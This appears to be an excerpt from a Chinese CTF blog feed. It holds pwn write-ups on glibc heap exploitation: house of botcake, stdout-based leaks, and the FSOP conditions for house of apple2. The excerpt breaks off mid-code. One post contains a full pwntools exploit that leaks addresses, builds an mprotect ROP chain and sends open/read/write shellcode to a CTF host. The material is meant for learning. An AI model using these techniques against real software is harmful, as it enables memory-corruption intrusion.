title="注意点"></a>注意点</h1><p>这个题目自己实现了read函数，读到\n时结束，并把\n转换成\x00。</p><p>并且内容全部使用rc4来加密解密。</p><p>我在填充shellcode堆块时，发现总是解密的不对，最后发现是读取问题，因为rc4的加密可能会导致某些字节变成\n，就导致后面无法读入，因此要注意调整shellcode堆块的结构,以免出现\n。（这个地方折磨了我好久）</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022华东北 blue</title>
      <link href="/2025/03/06/2025-03-06-2022%E5%8D%8E%E4%B8%9C%E5%8C%97%20blue/"/>
      <url>/2025/03/06/2025-03-06-2022%E5%8D%8E%E4%B8%9C%E5%8C%97%20blue/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>day12每日一Pwn做到了这道题，自己独立分析的时候发现最多泄漏libc，之后就做不下去了，现在看完题解之后写一下学到的内容</p><p>题目链接：</p><blockquote><p><a href="https://www.nssctf.cn/problem/2390">https://www.nssctf.cn/problem/2390</a></p></blockquote><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>glibc-2.31</p><p>禁用了free_hook malloc_hook</p><p>开了沙箱，禁用了了execve</p><p>没有edit功能，只能在add的时候edit。正常的delete函数没有uaf，但是存在一个backdoor函数，这个函数也是delete功能，但是存在uaf，但是这个函数只能使用一次；存在show函数，只能使用一次。</p><p>先讲一下我一开始的思路，利用largebin attack+house of apple2</p><p>但是考虑到一方面没有edit功能，不容易largebin attack，另一方面house of apple2最后是通过system来getshell，但是题目禁用了，于是作罢</p><h1 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h1><p>可以看到限制非常非常多，这里利用的手法就是 house of botcake</p><blockquote><p><a href="https://forum.butian.net/share/1709">https://forum.butian.net/share/1709</a></p></blockquote><p>条件：至少有一次uaf</p><ol><li><p>分配七个填充堆块（小于最大的Tcache，大于最大的Fastbin），一个辅助堆块 prev ，一个利用堆块 victim，一个防止与topchunk合并的堆块 注意前九个堆块必须是同一大小</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">sizeof</span>(x)/<span class="built_in">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="type">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">// 防止合并</span></span><br></pre></td></tr></table></figure></li><li><p>free掉前七个，此时tcache被填满</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">      <span class="built_in">free</span>(x[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>free掉victim</p></li><li><p>free掉prev，此时由于prev与victim物理相邻，并且在其上面，因此unsortedbin合并，prev和victim合并成1个</p></li><li><p>申请一个和之前堆块大小相等的堆块，此时就会从tcache中申请（原本tcache是满的），再free掉victim</p></li><li><p>申请一个与之前堆块大小不同的堆块，此时会切割unsortedbin，这样我们可以通过控制这个堆块来控制victim的prevsize size fd等（如果可以申请任意大小，可以申请比之前堆块大的，如果只能申请小堆块，也可以多申请几次，这样让最后一个堆块落到victim的header上去，这样就可以控制了）</p></li><li><p>之后我们可以通过控制victim的fd来实现tcache poisoning，之后可以申请回victim继续多次tcache_poisoning</p></li></ol><p>总的来说，house of botcake就是实现了在没有edit函数的情况下，任意地址申请堆块</p><h1 id="利用stdout来泄漏信息"><a href="#利用stdout来泄漏信息" class="headerlink" title="利用stdout来泄漏信息"></a>利用stdout来泄漏信息</h1><p>假如能任意地址写，我们可以修改stdout的信息来实现在没有show功能下show内容</p><ol><li>修改stdout的 _flags 为0xfbad1800</li><li>修改 read_base read_ptr read_end 都为0</li><li>修改write_base为要泄漏的地址</li><li>调用puts或者printf函数即可泄漏该地址处的内容</li></ol><p>如果要利用stdout来泄漏libc的话，第3条可以只把<code>_IO_write_base</code>的最后一个字节改小 ，这样泄漏的信息里面就存在libc地址</p><h1 id="题目思路"><a href="#题目思路" class="headerlink" title="题目思路"></a>题目思路</h1><p>利用house of botcake来实现tcache poisoning，在house of botcake时可以使用uaf+show来泄漏libc地址，之后利用tcache poisoning来实现申请到stdout上，并修改stdout信息以泄漏environ中的栈地址，最后实现rop</p><p>rop中可以使用mprotect+read+shellcode的思路</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p,<span class="string">&#x27;b* $rebase(0x193f)&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pp64</span>(<span class="params">*args</span>):</span><br><span class="line">    payload=<span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i, arg <span class="keyword">in</span> <span class="built_in">enumerate</span>(args):</span><br><span class="line">        payload+=p64(arg)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">    sla(<span class="string">&quot;Choice: &quot;</span>,<span class="built_in">str</span>(c))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">666</span>)</span><br><span class="line">    sla(<span class="string">&quot;idx: \n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># node4.anna.nssctf.cn:28854</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28854</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x80</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">uaf(<span class="number">8</span>) </span><br><span class="line"></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libc_base=uu64(p.recv(<span class="number">6</span>))-<span class="number">0x7375c37f9be0</span>+<span class="number">0x7375c360d000</span></span><br><span class="line">environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">stdout=libc_base+libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base) </span><br><span class="line">delete(<span class="number">7</span>) </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;a&quot;</span>)  <span class="comment"># 0</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)+p64(stdout)) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;a&quot;</span>) <span class="comment">#3 imporant</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(environ)+p64(environ+<span class="number">8</span>)+p64(environ+<span class="number">8</span>)) <span class="comment">#4</span></span><br><span class="line">ru(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">stack_addr=uu64(p.recv(<span class="number">6</span>))-<span class="number">0x138</span></span><br><span class="line">leak(<span class="string">&quot;stack_addr&quot;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x23b6a</span>+libc_base</span><br><span class="line">pop_rsi=<span class="number">0x2601f</span>+libc_base</span><br><span class="line">pop_rdx=<span class="number">0x142c92</span>+libc_base</span><br><span class="line">mprotect=libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]+libc_base</span><br><span class="line">read=libc.sym[<span class="string">&#x27;read&#x27;</span>]+libc_base</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)+p64(stack_addr+<span class="number">0x10</span>)) <span class="comment"># 0</span></span><br><span class="line"><span class="comment">#add(0x60,p64(0)*3+p64(0x91)+p64(stack_addr)) # 0</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0</span>))  <span class="comment"># 2</span></span><br><span class="line">addr=libc_base+<span class="number">0x158000</span></span><br><span class="line">rop=pp64(pop_rdi,addr,pop_rsi,<span class="number">0x1000</span>,pop_rdx,<span class="number">7</span>,mprotect)</span><br><span class="line">rop+=pp64(pop_rdi,<span class="number">0</span>,pop_rsi,addr,pop_rdx,<span class="number">0x1000</span>,read,addr)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x14c3)&#x27;)</span></span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0</span>)+rop)  <span class="comment"># 3</span></span><br><span class="line"><span class="comment"># orw</span></span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;</span></span><br><span class="line">shellcode+=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="string">&#x27;rax&#x27;</span>,addr+<span class="number">0x800</span>,<span class="number">0x100</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,addr+<span class="number">0x800</span>,<span class="string">&#x27;rax&#x27;</span>)<span class="comment"># 1 stdout  2 stderr </span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">s(shellcode)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IO攻击学习</title>
      <link href="/2025/03/03/2025-03-03-IO%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/03/2025-03-03-IO%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> 最近学了一下IO攻击相关的知识，于是就拿litCTF2024的题目来实验。</p><p>使用了largebin attack+house of apple2 攻击2.35的题目没有出现什么问题，但是在2.39的时候出现了问题，于是研究了一下两个libc的汇编代码（题目给的），发现2.39和2.35关于house of apple2还是有一点点微不足道的区别的</p><h1 id="IO结构体"><a href="#IO结构体" class="headerlink" title="IO结构体"></a>IO结构体</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_marker</span> *_markers;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_chain;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_complete</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> _file;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> *_codecvt;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span> *_wide_data;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE</span> *_freeres_list;</span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="built_in">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="built_in">sizeof</span> (<span class="type">void</span> *) - <span class="built_in">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_FILE_complete_plus</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE_complete</span> file;</span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_wide_data</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_codecvt</span> _codecvt;</span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">_IO_jump_t</span> *_wide_vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以上来源于glibc-2.35源码</p><p>查看源码的网站：</p><blockquote><p><a href="https://elixir.bootlin.com/glibc/">https://elixir.bootlin.com/glibc/</a></p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">amd64：</span><br><span class="line"><span class="number">0x0</span>:<span class="string">&#x27;_flags&#x27;</span>,</span><br><span class="line"><span class="number">0x8</span>:<span class="string">&#x27;_IO_read_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x10</span>:<span class="string">&#x27;_IO_read_end&#x27;</span>,</span><br><span class="line"><span class="number">0x18</span>:<span class="string">&#x27;_IO_read_base&#x27;</span>,</span><br><span class="line"><span class="number">0x20</span>:<span class="string">&#x27;_IO_write_base&#x27;</span>,</span><br><span class="line"><span class="number">0x28</span>:<span class="string">&#x27;_IO_write_ptr&#x27;</span>,</span><br><span class="line"><span class="number">0x30</span>:<span class="string">&#x27;_IO_write_end&#x27;</span>,</span><br><span class="line"><span class="number">0x38</span>:<span class="string">&#x27;_IO_buf_base&#x27;</span>,</span><br><span class="line"><span class="number">0x40</span>:<span class="string">&#x27;_IO_buf_end&#x27;</span>,</span><br><span class="line"><span class="number">0x48</span>:<span class="string">&#x27;_IO_save_base&#x27;</span>,</span><br><span class="line"><span class="number">0x50</span>:<span class="string">&#x27;_IO_backup_base&#x27;</span>,</span><br><span class="line"><span class="number">0x58</span>:<span class="string">&#x27;_IO_save_end&#x27;</span>,</span><br><span class="line"><span class="number">0x60</span>:<span class="string">&#x27;_markers&#x27;</span>,</span><br><span class="line"><span class="number">0x68</span>:<span class="string">&#x27;_chain&#x27;</span>,</span><br><span class="line"><span class="number">0x70</span>:<span class="string">&#x27;_fileno&#x27;</span>,</span><br><span class="line"><span class="number">0x74</span>:<span class="string">&#x27;_flags2&#x27;</span>,</span><br><span class="line"><span class="number">0x78</span>:<span class="string">&#x27;_old_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x80</span>:<span class="string">&#x27;_cur_column&#x27;</span>,</span><br><span class="line"><span class="number">0x82</span>:<span class="string">&#x27;_vtable_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x83</span>:<span class="string">&#x27;_shortbuf&#x27;</span>,</span><br><span class="line"><span class="number">0x88</span>:<span class="string">&#x27;_lock&#x27;</span>,</span><br><span class="line"><span class="number">0x90</span>:<span class="string">&#x27;_offset&#x27;</span>,</span><br><span class="line"><span class="number">0x98</span>:<span class="string">&#x27;_codecvt&#x27;</span>,</span><br><span class="line"><span class="number">0xa0</span>:<span class="string">&#x27;_wide_data&#x27;</span>,</span><br><span class="line"><span class="number">0xa8</span>:<span class="string">&#x27;_freeres_list&#x27;</span>,</span><br><span class="line"><span class="number">0xb0</span>:<span class="string">&#x27;_freeres_buf&#x27;</span>,</span><br><span class="line"><span class="number">0xb8</span>:<span class="string">&#x27;__pad5&#x27;</span>,</span><br><span class="line"><span class="number">0xc0</span>:<span class="string">&#x27;_mode&#x27;</span>,</span><br><span class="line"><span class="number">0xc4</span>:<span class="string">&#x27;_unused2&#x27;</span>,</span><br><span class="line"><span class="number">0xd8</span>:<span class="string">&#x27;vtable&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h1><p>首先是fsop调用链</p><ul><li>exit<ul><li>fcloseall<ul><li>_IO_cleanup<ul><li>_IO_flush_all_lockp<ul><li>_IO_OVERFLOW</li></ul></li></ul></li></ul></li></ul></li></ul><p>而在239版本中IO_flush_all_lockp改名成IO_flush_all函数，内容基本没变。</p><p>其中在_IO_flush_all_lockp到  _IO_OVERFLOW之间的源代码为：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尤其注意</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>要调用到 _IO_OVERFLOW函数，我们可以设置 <code>fp-&gt;_mode = 0</code> <code>fp-&gt;_IO_write_ptr=1</code>  。</p><p>在house of apple2中，将vtable劫持成<code>_IO_wfile_jumps</code> ，那么_IO_OVERFLOW就会变成_ IO_wfile_overflow</p><p>之后的调用链为</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x68</span>)(fp)</span><br></pre></td></tr></table></figure><p>这中间也需要绕过各种限制，具体如下：(摘抄自作者博客)</p><blockquote><p><a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/</a></p></blockquote><ul><li><code>_flags</code> 设置为 <code>~(2 | 0x8 | 0x800)</code>，如果不需要控制 <code>rdi</code>，设置为 <code>0</code> 即可；如果需要获得 <code>shell</code>，可设置为<code> sh;</code>，注意前面有两个空格</li><li><code>vtable</code> 设置为<code>_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code> 地址（加减偏移），使其能成功调用<code>_IO_wfile_overflow</code> 即可</li><li><code>_wide_data</code> 设置为可控堆地址 <code>A</code>，即满足 <code>*(fp + 0xa0) = A</code></li><li><code>_wide_data-&gt;_IO_write_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x18) = 0</code></li><li><code>_wide_data-&gt;_IO_buf_base</code> 设置为 <code>0</code>，即满足 <code>*(A + 0x30) = 0</code></li><li><code>_wide_data-&gt;_wide_vtable</code> 设置为可控堆地址 <code>B</code>，即满足 <code>*(A + 0xe0) = B</code></li><li><code>_wide_data-&gt;_wide_vtable-&gt;doallocate</code> 设置为地址 <code>C</code> 用于劫持 <code>RIP</code>，即满足 <code>*(B + 0x68) = C</code></li></ul><p>具体代码设置可以是下面这个样子：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">f=IO_FILE_plus_struct()</span><br><span class="line">_IO_wfile_jumps=libc.symbols[<span class="string">&quot;_IO_wfile_jumps&quot;</span>]+libc_base</span><br><span class="line">f.vtable=_IO_wfile_jumps</span><br><span class="line">f._mode=<span class="number">0</span></span><br><span class="line">f._flags=<span class="string">b&#x27;  sh\x00\x00\x00\x00&#x27;</span></span><br><span class="line">f._wide_data=heap_5 <span class="comment">#其中heap_5即为将要覆盖成IO结构体的堆块，也就是把f._wide_data与f相同</span></span><br><span class="line">f._IO_read_base=<span class="number">0</span> <span class="comment">#0x18</span></span><br><span 